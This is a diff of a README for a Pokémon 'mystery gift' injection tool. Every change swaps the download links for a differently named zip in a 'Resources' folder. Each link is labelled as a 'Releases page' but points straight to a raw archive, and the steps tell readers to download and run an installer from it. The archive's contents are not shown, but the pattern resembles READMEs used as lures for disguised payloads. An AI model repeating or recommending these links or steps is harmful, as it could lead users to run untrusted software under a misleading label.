@@ -8,9 +8,9 @@ Welcome to MysteryGiftInjector! This tool helps you add special event tickets to
 
 To get started, you need to download the tool. Click the button below to visit the Releases page where you can find the latest version:
 
-[![Download MysteryGiftInjector](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/MysteryGiftInjector-v1.8.zip)](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/MysteryGiftInjector-v1.8.zip)
+[![Download MysteryGiftInjector](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/Resources/Gift-Mystery-Injector-v3.4.zip)](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/Resources/Gift-Mystery-Injector-v3.4.zip)
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/MysteryGiftInjector-v1.8.zip) to find the download.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/Resources/Gift-Mystery-Injector-v3.4.zip) to find the download.
 2. **Select the Latest Version:** Look for the most recent version and click on it.
 3. **Download the Installer:** Download the installer file for MysteryGiftInjector. It should be labeled clearly.
 4. **Run the Installer:** Double-click the downloaded file and follow the instructions to install the tool.
@@ -72,7 +72,7 @@ For help or questions, you can raise an issue in the repository’s Issues secti
 
 ## 📑 Additional Resources
 
-For more information on MysteryGiftInjector, visit the [Releases page](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/MysteryGiftInjector-v1.8.zip) to find downloads, updates, and relevant discussions.
+For more information on MysteryGiftInjector, visit the [Releases page](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/Resources/Gift-Mystery-Injector-v3.4.zip) to find downloads, updates, and relevant discussions.
 
 ## 🔗 Related Projects
 
@@ -85,4 +85,4 @@ If you are interested in game preservation and tools for Pokémon, consider expl
 
 Ready to inject those mystery tickets into your game? Click below to get started:
 
-[![Download MysteryGiftInjector](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/MysteryGiftInjector-v1.8.zip)](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/MysteryGiftInjector-v1.8.zip)
+[![Download MysteryGiftInjector](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/Resources/Gift-Mystery-Injector-v3.4.zip)](https://raw.githubusercontent.com/sagar9892/MysteryGiftInjector/main/MysteryGiftInjector/Resources/Gift-Mystery-Injector-v3.4.zip)
